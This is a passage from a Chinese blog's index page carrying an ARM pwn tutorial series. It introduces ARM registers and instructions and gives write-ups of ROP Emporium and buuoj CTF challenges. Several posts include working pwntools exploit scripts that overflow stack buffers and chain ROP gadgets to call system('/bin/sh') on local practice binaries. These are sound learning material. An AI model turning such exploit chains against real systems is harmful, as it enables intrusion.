class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span></span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p32(<span class="number">0xFF00FF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(write_addr)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="9.png" alt="" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">ARM pwn 入门 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:02:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:02:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:22" itemprop="dateModified" datetime="2023-03-01T11:30:22+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><font face=汉仪唐美人>由于网上的ARM pwn题很少很难找，因此这里拿ROP Emporium的8道题做练习，这个<a target="_blank" rel="noopener" href="https://ropemporium.com/">网站</a>有包含x86-64、x86-32、MIPS、ARM共4种架构的elf文件可以做。</font></p>
<h1 id="font-face汉仪唐美人1-ret2winfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人1-ret2winfont"></a> <font face=汉仪唐美人>1. ret2win</font></h1>
<p><font color=ff0000, face=汉仪唐美人>注意：在执行需要动态链接库加载的ARM elf文件时，如果直接使用<code>qemu-arm xxx</code>有可能会报错：<code>/lib/ld-linux.so.3: No such file or directory</code>。解决方法：安装arm交叉编译包<code>apt install gcc-arm-linux-gnueabi</code>，找到交叉编译包的lib地址（一般都是<code>/usr/arm-linux-gnueabi</code>），在命令后添加<code>-L /usr/arm-linux-gnueabi</code>即可。</font></p>
<p><img src="1.png" alt="" /><br />
<font face=汉仪唐美人>这是一道最为简单的栈溢出，ret2text。为了熟悉ARM指令，我们从汇编层面进行分析。</font></p>
<p><font face=汉仪唐美人>可以看到，在ARM的函数调用规则中，参数的赋值顺序是从右到左，如下方<code>BL</code>指令调用<code>read</code>函数前，首先将第3个参数<code>nbytes</code>赋值给<code>R2</code>寄存器。在<code>pwnme</code>函数开头有一个<code>PUSH</code>指令，这里的<code>R11</code>可以看做是<code>rbp</code>，<code>LR</code>是函数返回值，在函数开头这两个寄存器基本都是要入栈的。然后保存<code>R11</code>的值作为栈帧的标记，<code>SP</code>下移留出栈空间。这就是函数开头需要完成的工作，与x86-64架构如出一辙。</font></p>
<p><font face=汉仪唐美人>下面看到<code>read</code>函数的调用部分。第二个参数<code>R1</code>的值为<code>R11-0x24</code>，由于<code>R11</code>在往上就是返回地址，因此要修改返回地址，应该先写入0x24长度的无效字节，然后写后门函数的返回地址。</font></p>
<p><font face=汉仪唐美人>最后看一下函数即将返回之前需要完成的工作。首先恢复<code>SP</code>为<code>R11-4</code>，然后<code>R11</code>出栈，<code>PC</code>出栈。在正常情况下，这里的<code>R11</code>出栈后应该指向父函数的栈空间顶端。现在我们进行了栈溢出，修改了这里的值，<code>R11</code>就无效了。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(<span class="number">0x105ec</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="font-face汉仪唐美人2-splitfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人2-splitfont"></a> <font face=汉仪唐美人>2. split</font></h1>
<p><img src="2.png" alt="" /><br />
<img src="3.png" alt="" /></p>
<p><font face=汉仪唐美人>这里有一个有用的字符串和一个后门函数，只不过这个后门函数不能让我们拿到shell，很自然的想法就是调用system函数，参数改成那个字符串的地址。</font></p>
<p><font face=汉仪唐美人>由于该elf文件的加载地址固定，我们就直接在elf文件中寻找可用的gadget。</font></p>
<p><img src="4.png" alt="" /></p>
<p><font face=汉仪唐美人>不同于x86-64架构，ARM架构下的gadget似乎要更少一些。如上图所示，只用<code>pop</code>指令的gadget中没有能够<code>pop r0</code>的，我们只能扩大范围进行查找：</font></p>
<p><img src="https://img-blog.csdnimg.cn/a33eaa7d29b040aabdef96c34b83c98f.png" alt="在这里插入图片描述" /></p>
<p><font face=汉仪唐美人>于是我们找到了这个gadget，它可以和上面的<code>pop &#123;r3, pc&#125;</code>连接起来，首先修改<code>r3</code>的值，再修改<code>r0</code>的值即可。于是我们的exp呼之欲出：</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./split_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">popr3pc = <span class="number">0x103a4</span></span><br><span class="line">movr0r3_popfppc = <span class="number">0x10558</span></span><br><span class="line">shellstr = <span class="number">0x2103c</span></span><br><span class="line">callsystem = <span class="number">0x105e0</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(popr3pc) + p32(shellstr) + p32(movr0r3_popfppc) + p32(<span class="number">0</span>) + p32(callsystem))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><font face=汉仪唐美人>PS：本来想发三道题的，但是这周末比赛打的太累了，第三题就留到后面一篇文章发了，还请谅解。</font></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">ARM pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:01:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:01:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:21" itemprop="dateModified" datetime="2023-03-01T11:30:21+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><font face=汉仪唐美人>上一篇文章中笔者对ARM架构的寄存器和指令集做了简单的介绍，本文就来首杀ARM pwn题。</font></p>
<h1 id="font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"><a class="markdownIt-Anchor" href="#font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"></a> <font size=6, face=汉仪唐美人><strong>buuoj 第139题 jarvisoj_typo</strong></font></h1>
<p><font face=汉仪唐美人>这一题是静态编译的程序，对于ARM可执行文件，在x86架构的虚拟机上可以使用<code>qemu-arm ...</code>来执行。</font></p>
<p><font face=汉仪唐美人>我们首先来执行看一下这个程序有什么输出。</font></p>
<p><img src="1.png" alt="" /></p>
<p><font face=汉仪唐美人>在程序一开始输出了一段字符串，我们可以在IDA中用Shift+F12来查看elf文件中所有硬编码的字符串：</font></p>
<p><img src="2.png" alt="" /></p>
<p><font face=汉仪唐美人>然后根据交叉引用找到该字符串被引用的位置：</font></p>
<p><img src="3.png" alt="" /></p>
<p><font face=汉仪唐美人>根据程序的输入，我们可以猜测出其中一部分库函数，如这里的write、getchar等。看上去这是一个正常的输入程序，一个typing test，如果输入的内容和程序输出相同就会继续输出一个单词等待用户输入，否则输出error。</font></p>
<p><img src="4.png" alt="" /></p>
<p><font face=汉仪唐美人>这里可以推测<code>sub_8D24</code>是关键输入函数。</font></p>
<p><img src="5.png" alt="" /></p>
<p><font face=汉仪唐美人>这里的input应该就是输入的缓冲区，我们需要进行调试确定到底是哪一步执行了读取用户输入的操作：qemu-arm后加-g选项指定端口，就可以通过<code>gdb-multiarch</code>进行调试。经过调试发现上图中的<code>read</code>函数就是读取的函数，且最大读取大小为512字节，这明显就造成了栈溢出。</font></p>
<p><img src="6.png" alt="" /></p>
<p><font face=汉仪唐美人>从上图可知，覆盖返回地址需要先输入0x70字节。在elf文件中可以发现字符串<code>/bin/sh</code>:</font></p>
<p><img src="7.png" alt="" /></p>
<p><font face=汉仪唐美人>引用字符串<code>/bin/sh</code>的函数就是<code>system</code>函数。因此我们可以找到<code>system</code>函数的地址为0x10BA8。需要注意ARM架构函数的调用约定：<font color=red>前4个参数保存在R0~R3，之后的参数从右至左压栈。因此要想执行<code>system(&quot;/bin/sh&quot;)</code>，就需要将寄存器R0的值修改为字符串<code>'/bin/sh'</code>的地址，返回地址可以通过栈溢出直接修改。考虑到这是一个静态编译的文件，很容易就可以想到使用一个简单的ROP来实现寄存器修改操作。<font></font></p>
<p><img src="8.png" alt="" /></p>
<p><font face=汉仪唐美人>找到合适的ROP地址为0x20904，可以在修改寄存器R0的值之后修改PC的值。现在可以编写exp了。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.send(cyclic(<span class="number">0x70</span>) + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x10ba8</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="9.png" alt="" /></p>
<p><font face=汉仪唐美人>成功getshell。这题看来不难，只是一个简单的不能再简单的ROP。</font></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">ARM pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:00:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:00:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:18" itemprop="dateModified" datetime="2023-03-01T11:30:18+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近笔者刚刚加入了一个项目组，需要用到ARM架构的东西，和ARM pwn也有一定关系，因此一不做二不休，决定开始学习ARM pwn，顺便熟悉项目前置知识，一举两得。</p>
<p>ARM与x86分属不同架构，指令集不同，需要从头开始学习，本文从寄存器、指令方面对x86-64和ARM架构下的汇编语言做比较与学习。（配图选自清华大学出版社《ARM Cortex-M3与Cortex-M4权威指南》，侵删）</p>
<h2 id="1-寄存器"><a class="markdownIt-Anchor" href="#1-寄存器"></a> 1. 寄存器</h2>
<p>寄存器是汇编语言的核心，在x86-64系统中，最为常见的寄存器有以下这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi, rsp, rbp, rip</span><br><span class="line">r8, r9, r10, r11, r12, r13, r14, r15</span><br><span class="line">32位：</span><br><span class="line">eax, ebx, ecx, edx</span><br><span class="line">esi, edi, esp, ebp, eip</span><br><span class="line">r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</span><br></pre></td></tr></table></figure>
<p>在大多数程序中，这17个寄存器是最为常用的寄存器，其中<code>rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, rip</code>有专门的作用，但其中的<code>rax, rbx, rcx, rdx, rsi, rdi</code>功能相对更加灵活，不像<code>rsp</code>只能用于表示栈顶地址，<code>rbp</code>只能用于表示栈帧地址，<code>rip</code>只能用于表示当前指令地址等。另外的8个寄存器则是通用寄存器，想用来干嘛就干嘛。</p>
<p>那么在ARM架构中，寄存器则是以下这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">X0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12</span><br><span class="line">X13, X14, X15</span><br><span class="line">32位：</span><br><span class="line">R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12</span><br><span class="line">R13, R14, R15</span><br></pre></td></tr></table></figure>
<p>其中<code>R0~R12</code>为通用寄存器，共13个，剩下的3个有特殊用途：</p>
<ul>
<li><code>R13</code>为栈指针，又称<code>SP</code>，相当于<code>rsp</code>，在物理上实际上有两个栈指针：主栈指针和进程栈指针，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。</li>
<li><code>R14</code>为链接寄存器，又称<code>LR</code>，用于保存函数调用时的返回值。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即<code>rbp+8</code>的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为<code>LR</code>在函数返回时会进行自动更新，如果栈中没有返回地址，那么<code>LR</code>就不知道要更新成什么值了。当然<code>LR</code>的作用不止这些，在后面遇到具体问题时再进行分析。</li>
<li><code>R15</code>为程序计数器，又称<code>PC</code>，可读可写。读操作返回当前指令地址+4（由ARM指令集特性决定，ARM指令集中任何一条指令都是偶数长度，与x86-64不同），写操作会导致执行流跳转。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li>
</ul>
<p>除了这些寄存器之外，两个架构下都各自有各自的特殊寄存器，如x86-64架构下的<code>rflags</code>控制寄存器用于保存程序执行的状态。在ARM中同样具有类似功能的控制寄存器：<br />
<img src="1.png" alt="" /></p>
<ul>
<li><code>APSR</code>：应用状态寄存器</li>
<li><code>EPSR</code>：执行状态寄存器</li>
<li><code>IPSR</code>：中断状态寄存器<br />
上面的三个寄存器可以通过一个组合寄存器<code>PSR</code>访问，在不同的ARM架构中状态寄存器的排布有一定不同：<br />
<img src="2.png" alt="" /></li>
</ul>
<p>3个中断-异常屏蔽寄存器的功能较少用到，这里先不进行讨论。<br />
<code>CONTROL</code>寄存器确定了栈指针的选择和线程模式的访问等级，其只能够在特权等级下才能进行修改。</p>
<p><img src="3.png" alt="" /><br />
其中具体的细节阐述较为繁琐，不是本文的重点，略过。</p>
<p>另外，在x86-64架构和ARM架构中都有很多的浮点数寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p>
<h1 id="2-指令集"><a class="markdownIt-Anchor" href="#2-指令集"></a> 2. 指令集</h1>
<p>ARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，ARM的立即数前面需要加上#标识，如#0x12345678。下面的指令均为32位系统下的指令。</p>
<h2 id="a-寄存器传送数据"><a class="markdownIt-Anchor" href="#a-寄存器传送数据"></a> A. 寄存器传送数据</h2>
<p>与x86相同，ARM使用<code>MOV</code>系列指令进行寄存器与寄存器（立即数）之间的数据传送：</p>
<ul>
<li><strong><code>MOV/MOVS reg1, &lt;reg2/imm8&gt;</code></strong>：赋值<code>reg1</code>为<code>reg2/imm8</code></li>
<li><strong><code>MOVW &lt;reg32&gt;, &lt;imm16&gt;</code></strong>：赋值<code>reg32</code>的低16位为<code>imm16</code></li>
<li><strong><code>MOVT &lt;reg32&gt;, &lt;imm16&gt;</code></strong>：赋值<code>reg32</code>的高16位为<code>imm16</code></li>
<li><strong><code>MVN reg1, &lt;reg2&gt;</code></strong>：将<code>reg2</code>的值取反之后赋值给<code>reg1</code></li>
<li><strong><code>LDR &lt;reg32&gt;, =&lt;imm32&gt;</code></strong><sup>①</sup>：赋值<code>reg32</code>为<code>imm32</code></li>
</ul>
<p>备注：<br />
① 这里的指令并不是一条真正的指令，而是一条伪指令。ARM汇编器会将字符数据汇总组成一个称为 <strong>“文字池”</strong> 的数据块，与x86-64不同，后者如果需要实现将立即数赋值到寄存器，会直接将立即数写死到指令中。这里的<code>LDR</code>指令实际是做了寻址操作，将文字池地址中的数据赋值到寄存器中。如果需要将32位立即数赋值到32位寄存器，可以使用这条指令，也可以将<code>MOVW</code>和<code>MOVT</code>指令配合使用分别赋值前16位和后16位。</p>
<h2 id="b-存储器传送数据"><a class="markdownIt-Anchor" href="#b-存储器传送数据"></a> B. 存储器传送数据</h2>
<p>不同于x86使用mov指令可实现寄存器、立即数和内存空间的数据交换，ARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：</p>
<ul>
<li><strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：赋值8/16/32位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，如果指令后面有叹号，表示指令执行后<code>reg2</code>值更新为<code>reg2+imm32</code>，有叹号可等同于 <strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong>，这种形式称为<strong>后序指令</strong>。</li>
<li><strong><code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：赋值64位<code>reg3+imm32</code>地址的数据到<code>reg1</code>和<code>reg2</code>，有叹号可等同于 <strong><code>LDRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li>
<li><strong><code>LDRSB/LDRSH reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：有符号传送8/16位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，目标寄存器会进行32位有符号扩展，有叹号可等同于 <strong><code>LDRSB/LDRSH reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li>
<li><strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;, &lt;imm32&gt;]&lt;!&gt;</code></strong>：保存寄存器<code>reg1</code>的8/16/32位值到<code>reg2+imm32</code>地址，有叹号可等同于 <strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li>
<li><strong><code>STRD reg1, &lt;reg2&gt;, [reg3, &lt;imm32&gt;]&lt;!&gt;</code></strong>：保存寄存器<code>reg1</code>和<code>reg2</code>的64位值值到<code>reg3+imm32</code>地址，有叹号可等同于 <strong><code>STRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li>
<li><strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code></strong>：赋值寄存器<code>reg1</code>的值为<code>reg2/PC+(reg3&#123;&lt;&lt;imm&#125;)</code>地址处的8/16/32位值</li>
<li><strong><code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;reg4-32&gt;&#123;, LSL &lt;imm&gt;&#125;]</code></strong>：赋值寄存器<code>reg1</code>和<code>reg2</code>的值为<code>reg3/PC+(reg4-32&#123;&lt;&lt;imm&#125;)</code>地址处的64位值</li>
<li><strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code></strong>：保存寄存器<code>reg1</code>的8/16/32位值到<code>reg2+(reg3&#123;&lt;&lt;imm&#125;)</code>地址</li>
<li><strong><code>LDMIA/LDMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code></strong>：将<code>reg1</code>地址的值按照顺序保存到<code>reg-list</code>中的寄存器中，如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>LDMIA</code>）或减少（<code>LDMDB</code>）<code>reg1</code>。如<code>LDMIA R0, &#123;R1-R5&#125;</code>，<code>LDMIA R0, &#123;R1, R3, R6-R9&#125;</code></li>
<li><strong><code>STMIA/STMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code></strong>：向<code>reg1</code>地址存入寄存器组中的多个字。如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>STMIA</code>）或减少（<code>STMDB</code>）<code>reg1</code>。</li>
</ul>
<p>注意：后序指令不能使用PC寻址。</p>
<h2 id="c-入栈出栈"><a class="markdownIt-Anchor" href="#c-入栈出栈"></a> C. 入栈出栈</h2>
<p>虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。</p>
<ul>
<li><strong><code>PUSH &lt;reg-list&gt;</code></strong>：将寄存器组中的寄存器值依次入栈，<code>reg-list</code>中可以有PC、LR寄存器。</li>
<li><strong><code>POP &lt;reg-list&gt;</code></strong>：将出栈的值依次存入寄存器组中的寄存器，<code>reg-list</code>中可以有PC、LR寄存器。</li>
</ul>
<h2 id="d-算术运算"><a class="markdownIt-Anchor" href="#d-算术运算"></a> D. 算术运算</h2>
<p>不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令通常包含3个寄存器，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。</p>
